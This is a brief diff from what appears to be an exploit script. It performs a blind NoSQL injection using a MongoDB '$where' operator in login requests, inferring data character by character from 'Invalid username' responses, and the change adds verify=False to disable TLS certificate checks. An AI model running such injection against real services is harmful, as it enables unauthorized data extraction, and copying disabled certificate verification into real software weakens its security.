@@ -24,7 +24,7 @@ class Exploit:
                     'password': password,
                     '$where': whereOperatorKey
                 }
-                loginRespond = requests.post(f'{self.baseUrl}{LOGIN_ENDPOINT}', json=loginData)
+                loginRespond = requests.post(f'{self.baseUrl}{LOGIN_ENDPOINT}', json=loginData, verify=False)
                 isValidCharacter = False if 'Invalid username' in loginRespond.text else True
                 isLastCharacter = character == LAST_CHARACTER
                 isEmptyFieldName = True if len(fieldName) == 0 else False
